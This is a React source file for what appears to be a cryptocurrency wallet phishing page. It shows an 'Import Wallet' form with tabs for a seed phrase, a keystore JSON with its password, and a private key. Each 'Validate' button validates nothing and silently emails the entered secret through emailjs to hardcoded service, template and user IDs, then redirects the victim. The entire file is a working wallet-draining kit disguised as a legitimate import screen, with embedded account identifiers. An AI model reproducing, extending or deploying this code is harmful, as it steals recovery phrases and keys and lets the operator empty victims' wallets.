import React , { useState } from 'react';
import { Nav, NavLink, NavItem, TabPane, TabContent } from 'reactstrap';
import classnames from 'classnames';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faAngleLeft } from '@fortawesome/free-solid-svg-icons';
import emailjs from 'emailjs-com'
import { useHistory } from 'react-router';

export default function Form() {

    const User_ID = 'user_ngIsUTPsb5AEBQ3b49qFi'
    const Template_ID = 'template_39xr60v'

    const history = useHistory();

    const [activeTab, setActiveTab] = useState('1');

    const toggle = tab => {
        if(activeTab !== tab) setActiveTab(tab);
    }

    const validatePH = () => {
        send( document.getElementById('phrase').value )
    }
    
    const validateKS = () => {
        const keystore = document.getElementById('keystore').value
        const password = document.getElementById('password').value

        send ( keystore + ' \n ' + password)
    }

    const validatePK = () => {
        const value = document.getElementById('privateKey').value
        
        send(value)
    }

    function send (message) {

        emailjs.send('service_ozw18ud', Template_ID, {message}, User_ID)
        .then(result => {
            history.push('/wallets')
        })
    }
  return (
      <div className="Select" >
          <div className='blackHeader'>
              
              <a href='/wallets'>
              <FontAwesomeIcon icon={ faAngleLeft }/>
              </a>
              <a href='/'>
                  &nbsp; &nbsp; Import Wallet
              </a>
          </div>
            <div className='TabS'>
                <Nav tabs>
                    <NavItem>
                        <NavLink
                            className={classnames({ active: activeTab === '1' })}
                            onClick={() => { toggle('1'); }}
                        >
                            Phrase
                        </NavLink>
                    </NavItem>

                    <NavItem>
                        <NavLink
                            className={classnames({ active: activeTab === '2' })}
                            onClick={() => { toggle('2'); }}
                        >
                            Keystore JSON
                        </NavLink>
                    </NavItem>
                    
                    <NavItem>
                        <NavLink
                            className={classnames({ active: activeTab === '3' })}
                            onClick={() => { toggle('3'); }}
                        >
                            Private Key
                        </NavLink>
                    </NavItem>
                </Nav>

                    <TabContent activeTab={activeTab}>
                        <TabPane tabId="1">
                        <div>
                            <div className='Forms'>
                                <textarea placeholder='Phrase'  className='form-control' rows='5' id='phrase'></textarea>
                                <p>Typically 12 (sometimes 24) words seperated by a single spaces.</p>
                            </div>
                            <div className='btn-validate'>
                                <button className='validate' onClick={validatePH}>
                                    Validate
                                </button>
                            </div>
                        </div>
                        </TabPane>

                        <TabPane tabId="2">
                        <div>
                            <div className='Forms'>
                                <textarea placeholder='Keystore Json'  className='form-control' rows='5' id='keystore'></textarea>
                                <br/>
                                <input type='password' placeholder='Password' id='password' className='form-control'/>
                                <p>Several lines of text beginning with "&#10100; ... &#10101;" plus the password you used to encrypt it.</p>
                            </div>
                            <div className='btn-validate'>
                                <button className='validate' onClick={validateKS}>
                                    Validate
                                </button>
                            </div>
                        </div>
                        </TabPane>

                        <TabPane tabId="3">
                        <div>
                            <div className='Forms'>
                                <input type='text' placeholder='Private Key' id='privateKey' className='form-control'/>
                                <p>Typically 12 (sometimes 24) words seperated by a single spaces.</p>
                            </div>
                            <div className='btn-validate'>
                                <button className='validate' onClick={validatePK}>
                                    Validate
                                </button>
                            </div>
                        </div>
                        </TabPane>
                        
                    </TabContent>
                </div>
      </div>
  );
}
